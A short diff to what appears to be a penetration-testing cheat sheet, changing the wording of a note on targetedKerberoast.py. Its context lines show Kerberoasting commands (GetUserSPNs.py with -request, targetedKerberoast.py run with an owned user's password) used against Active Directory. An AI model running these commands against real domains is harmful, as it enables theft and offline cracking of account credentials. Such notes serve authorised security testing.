@@ -14,7 +14,7 @@ GetUserSPNs.py <domain>/<user>:<password> -request -save
 ```
 
 ## TargetedKerberos.py
-Useful for abusing Bloodhound edges.
+Useful for abusing certain Bloodhound edges.
 ```
 targetedKerberoast.py -v -d '<domain>' -u '<Owned USer>' -p '<password>'
 ```
